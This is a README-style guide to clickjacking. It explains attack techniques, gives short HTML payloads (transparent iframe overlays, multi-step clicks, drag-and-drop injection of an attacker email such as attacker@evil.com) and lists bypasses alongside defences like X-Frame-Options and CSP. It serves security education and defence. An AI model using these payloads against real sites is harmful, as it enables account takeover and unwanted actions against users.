# clickjacking-advanced-guide


# 🛡️ Clickjacking – Complete Guide

> **Author:** *Guljar-E-Mostafa*

---

## 📌 What is Clickjacking?

**Clickjacking** is a UI redressing attack where a user is tricked into clicking on hidden or disguised elements on a webpage.

The attacker overlays or manipulates UI components (often using transparent iframes) to make users perform unintended actions such as:

* 🔐 Submitting credentials
* 💳 Initiating transactions
* 📥 Downloading malware
* 🔁 Redirecting to malicious pages
* 🛒 Performing unwanted purchases

---

## ⚔️ Common Clickjacking Techniques

### 1. Prepopulated Form Trick

Some applications accept **GET parameters** to auto-fill forms.

👉 Attackers abuse this to:

* Inject malicious data into forms
* Trick users into clicking **Submit**

---

### 2. Drag & Drop Injection

Instead of asking users to input data:

* User is tricked into dragging content
* Hidden payload injects attacker-controlled values

---

### 3. Basic Clickjacking Payload

```html
<style>
iframe {
    position:relative;
    width: 500px;
    height: 700px;
    opacity: 0.1;
    z-index: 2;
}
div {
    position:absolute;
    top:470px;
    left:60px;
    z-index: 1;
}
</style>

<div>Click me</div>
<iframe src="https://vulnerable.com/email?email=attacker@evil.com"></iframe>
```

---

### 4. Multi-Step Clickjacking

```html
<style>
iframe {
    position:relative;
    width: 500px;
    height: 500px;
    opacity: 0.1;
    z-index: 2;
}
.firstClick, .secondClick {
    position:absolute;
    top:330px;
    left:60px;
    z-index: 1;
}
.secondClick {
    left:210px;
}
</style>

<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://vulnerable.net/account"></iframe>
```

---

### 5. Drag & Drop + Click Payload

```html
<div id="payload" draggable="true"
     ondragstart="event.dataTransfer.setData('text/plain', 'attacker@gmail.com')">
     <h3>DRAG ME</h3>
</div>
```

---

### 6. XSS + Clickjacking

If:

* A page has **self-XSS**
* And is vulnerable to **clickjacking**

👉 Attacker can:

1. Preload XSS payload via GET
2. Trick user into clicking submit
3. Execute XSS

---

### 7. Double Clickjacking

* Victim is asked to **double-click**
* Page switches between clicks
* Final click lands on a **real sensitive button**

⚠️ Can bypass many protections.

---

### 8. Popup-based Clickjacking (No iframe)

* Uses `window.open()`
* Moves popup under cursor
* Aligns with target button

---

### 9. SVG Filter UI Redressing (Advanced)

Attackers can:

* Warp UI
* Fake CAPTCHA
* Hide sensitive content

```html
<iframe src="https://victim.example"
        style="filter:url(#captchaFilter)"></iframe>
```

---

### 10. Pixel-Based UI State Detection

Attackers can:

* Detect UI states
* Build logic (AND, OR, XOR)
* Guide multi-step attacks

---

### 11. Extension Clickjacking

Targets browser extensions (e.g., password managers):

* Autofill dropdown hijacked
* User click exposes sensitive data

---

## 🛡️ Clickjacking Defenses

### 🔐 1. X-Frame-Options

```http
X-Frame-Options: deny
X-Frame-Options: sameorigin
```

---

### 🔐 2. Content Security Policy (CSP)

```http
Content-Security-Policy: frame-ancestors 'none';
```

---

### 🔐 3. Frame Source Control

```http
Content-Security-Policy: frame-src 'self' https://trusted.com;
```

---

### 🔐 4. Anti-CSRF Tokens

* Prevent unauthorized actions
* Protect against clickjacking + CSRF combo

---

### 🔐 5. Frame-Busting Script

```javascript
if (top !== self) {
    top.location = self.location;
}
```

---

### 🔐 6. iframe Sandbox

```html
<iframe sandbox="allow-forms allow-scripts"></iframe>
```

---

## ⚠️ Bypass Techniques

* iframe sandbox abuse
* popup-based attacks
* double-click timing
* SVG filter manipulation
* extension UI hijacking

---

## 📊 Key Takeaways

* Clickjacking is a **UI-based attack**
* Works best when combined with:

  * XSS
  * CSRF
* Modern attacks use **advanced rendering tricks (SVG, pixel probing)**

---

## 🧠 Bug Bounty Tips

Look for:

* Missing `X-Frame-Options` / CSP
* One-click sensitive actions
* OAuth permission prompts
* Account settings / payment features

---

## 📜 License

This project is for **educational and ethical security research purposes only**.

---

If you want next level:

* 🔥 Add **real bug bounty case studies**
* 🚀 Add **automation scripts (Burp, JS payloads)**
* 📄 Convert to **LinkedIn post + PDF**

Just tell me 👍
